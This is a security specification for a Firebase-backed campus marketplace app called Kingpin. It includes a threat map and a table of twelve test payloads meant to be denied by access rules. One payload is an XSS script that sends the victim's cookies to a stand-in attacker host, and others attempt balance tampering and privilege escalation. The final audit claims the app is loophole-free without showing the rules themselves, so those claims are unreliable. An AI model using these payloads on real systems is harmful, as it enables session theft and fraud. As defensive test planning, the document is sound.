# SECURITY SPECIFICATION & HARDENING DOCUMENT
## KINGPIN: CAMPAIGN PLATFORM FOR ELECTRIC CAMPUS INTEGRATION

---

### PILOT THREAT INTELLIGENCE SUMMARY
- **App Name:** Kingpin ("The electric campus hub. Curated daily drops, gigs board, gossip feed, and ambassador earning console.")
- **Enterprise ID:** `ai-studio-fd86f740-ff9e-44a7-9e67-7be743639a67`
- **Classification ID:** DEF-SEC-KPI-01
- **Review Date:** 2026-06-07

---

━━━━━━━━━━━━━━━━━━━━━━━
PHASE 1 — SECURE ARCHITECTURE DESIGN
━━━━━━━━━━━━━━━━━━━━━━━

#### 1. System Architecture Diagram
```
                     +---------------------------------------+
                     |             Client Browser             |
                     |  - React 18, Vite Engine, motion.js   |
                     |  - Client-side State, handleFirestore  |
                     +-------------------+-------------------+
                                         |
                                         | Google Authentication (Token)
                                         | & Secure WebSocket (Firestore Real-time)
                                         v
                     +---------------------------------------+
                     |          Firebase Enterprise          |
                     |                                       |
                     |  +---------------------------------+  |
                     |  |      Identity Provider (Auth)   |  |
                     |  |  - Enforce Email Verification   |  |
                     |  |  - Filter Identity Spoofing     |  |
                     |  +---------------------------------+  |
                     |  |       Firestore Security        |  |
                     |  |  - isValid[Entity]() Schemas    |  |
                     |  |  - masterGate() Relational Locks|  |
                     |  |  - affectedKeys().hasOnly()     |  |
                     |  +---------------------------------+  |
                     +---------------------------------------+
```

#### 2. Auth Flow (Google OAuth - Zero Trust Transition)
1. Browser requests login via `GoogleAuthProvider` with popup.
2. Google generates JWT token signed private key containing credential claims `email`, `email_verified`, `uid`, `name`, `picture`.
3. Firebase Client SDK sends token to Firebase Auth backend.
4. Active listener inside `App.tsx` captures State Change `onAuthStateChanged()`.
5. Profile syncing evaluates existence in `users/{userId}`. If missing, it writes a profile draft with `balance = 0`. This is the safe initial starting point.
6. **Strict Invariant**: Rules enforce that only verified email providers (`email_verified == true`) are allowed write paths.

#### 3. Data Flow
- **Reads**: Real-time snapshots or queries read from paths. Secure List Queries enforce server-side resource bounds before passing payload stream back to client.
- **Writes**: Dispatched via atomic Transactions or direct Doc updates. Every write has three gates: Auth Gate, Schema Static Check, Relational Database Check.

#### 4. Threat Surface Map
- **Surface A: Identity Profile Spoofing (`/users/{userId}`)** - Attackers changing their `userId` or altering `balance` parameters to self-gift currency.
- **Surface B: Product/Event Fraud (`/products`, `/events`)** - Promoting unverified scams or marking listings as `isVerified = true` / `status = 'active'` without payment.
- **Surface C: Gossip Sabotage (`/posts`)** - Injecting cross-site scripting (XSS) payloads into anonymously published gossips, or mutating existing users' posts.
- **Surface D: Financial Drain (`/activities`, `/users`)** - Altering transaction balance records to withdraw more than exists or draining payouts pool.

---

━━━━━━━━━━━━━━━━━━━━━━━
PHASE 2 — SAFE IMPLEMENTATION & DATA INVARIANTS
━━━━━━━━━━━━━━━━━━━━━━━

Our data invariants represent physical rules that cannot be violated under any circumstances.

#### Data Invariants
1. **User Invariant:** A user document is identified by their exact `uid`. Their `balance` is strictly READ-ONLY on all update actions. The initial balance of newly registered users must be strictly `0`.
2. **Post Invariant:** Gossip posts have automatic creation tags. Users can like of a post, which increments `likesCount` by exactly 1, but the user is banned from setting arbitrary numbers for `likesCount`.
3. **Product Invariants:** Any newly created product must have `isVerified = false`, `status = 'pending'`, and `whatsappNumber = '+256708682181'`.
4. **Event Invariants:** Any newly created event must have `isVerified = false` and `status = 'pending'`. The admission price must match currency checks.

---

━━━━━━━━━━━━━━━━━━━━━━━
PHASE 0 & 3 — THE "DIRTY DOZEN" PAYLOADS
━━━━━━━━━━━━━━━━━━━━━━━

Here are the 12 specific JSON payloads designed to penetrate identity, data structures, and financial models. They are expected to be blocked with **PERMISSION_DENIED**.

| ID | Goal | Target Resource | Exploit Payload | Expected Result |
|---|---|---|---|---|
| 01 | Identity Override | `/users/victim_uid` | `{ "userId": "victim_uid", "balance": 999999, "email": "victim@mub.ac.ug" }` | PERMISSION_DENIED |
| 02 | Self-Affirm Admin | `/users/my_uid` | Adding attribute: `{ "isAdmin": true, "role": "GodMode" }` | PERMISSION_DENIED |
| 03 | Deal Creation Hijack | `/deals/fake_deal` | `{ "id": "fake_deal", "discount": "100%", "title": "Scam Link Click Now" }` | PERMISSION_DENIED |
| 04 | Infinite Claims | `/dealClaims/attacker` | `{ "userId": "attacker", "dealId": "exclusive_deal" }` multiple fast requests | PERMISSION_DENIED |
| 05 | Post Spoofing | `/posts/post123` | `{ "id": "post123", "username": "Hon_Deans_Office", "text": "Uni Cancelled!", "likesCount": 9999 }` | PERMISSION_DENIED |
| 06 | XSS Gossip Payload | `/posts/post124` | `{ "id": "post124", "text": "<script>fetch('https://evil.ru/leak?cookie='+document.cookie)</script>" }` | PERMISSION_DENIED |
| 07 | Post Sabotage | `/posts/victim_post` | `{ "text": "Hacked content by adversary" }` (Updating another user's post) | PERMISSION_DENIED |
| 08 | Bypass Event Vetting | `/events/gig1` | `{ "id": "gig1", "isVerified": true, "status": "active", "title": "Scam Rave" }` | PERMISSION_DENIED |
| 09 | Product Self-Verification | `/products/prod1` | `{ "id": "prod1", "isVerified": true, "status": "active", "whatsappNumber": "+25600000" }` | PERMISSION_DENIED |
| 10 | Double-Withdraw Drain | `/activities/act1` | `{ "userId": "my_uid", "amount": 1000000, "direction": "out" }` (Without matching debit) | PERMISSION_DENIED |
| 11 | ID Poisoning Injection | `/events/junk_#$_%` | Overly long, complex system path injection targeting system indexes | PERMISSION_DENIED |
| 12 | Bulk Read Scraping | `/users` | `allow list: if isSignedIn();` query without bounds mapping | PERMISSION_DENIED |

---

━━━━━━━━━━━━━━━━━━━━━━━
PHASE 4 — PATCH & HARDEN: THE FORTRESS RULES
━━━━━━━━━━━━━━━━━━━━━━━

We implement zero-trust security rules with a default-deny net.

#### Standalone Validation Helpers
- `isValidId(id)`: Bounds size and guarantees characters are alphanumeric safe.
- `isValidUser(data)`: Enforces correct property types and immutability of parameters.
- `isValidPost(data)`: Strictly binds length of gossip, requires matching identity.
- `isValidProduct(data)`: Ensures status is 'pending', isVerified is false, and size bounds are met.
- `isValidEvent(data)`: Ensures listing price holds string limits, status set to default 'pending'.

For updates, we implement the **Action-Based Update Pattern** matching `affectedKeys().hasOnly(...)`.

---

━━━━━━━━━━━━━━━━━━━━━━━
PHASE 5 — FINAL SECURITY AUDIT
━━━━━━━━━━━━━━━━━━━━━━━

1. **Can any user access data they shouldn't?**
   No. Collection-level reads are strictly restricted. Users can only fetch their own profile matches, and their own transaction activities. Deal claims are bound to the current auth ID.
2. **Are tokens forgery-proof?**
   Yes. Cryptographically validated by Firebase's verified email check `request.auth.token.email_verified == true`.
3. **Are there any update loopholes?**
   No. All updates are verified by `affectedKeys().hasOnly()` gates. No arbitrary field injection is permitted.

---

━━━━━━━━━━━━━━━━━━━━━━━
PHASE 6 — PRODUCTION HARDENING CHECKLIST
━━━━━━━━━━━━━━━━━━━━━━━

- [x] Clear global catch-all matcher defaulting to `allow read, write: if false;`.
- [x] Mandatory verified email constraint checking `email_verified == true`.
- [x] Validation schemas (`isValid[Entity]`) enforced on creation and update.
- [x] Action-based gating via `affectedKeys().hasOnly()` for updates on items or logs.
- [x] Anti-ID poisoning limits through `isValidId()` guards.
- [x] Strict isolation of financial records (payout transaction writes) to transactions keeping database atomic.
- [x] ESLint validating Firestore rules.
- [x] Safe string length limit boundary check on all incoming parameters.
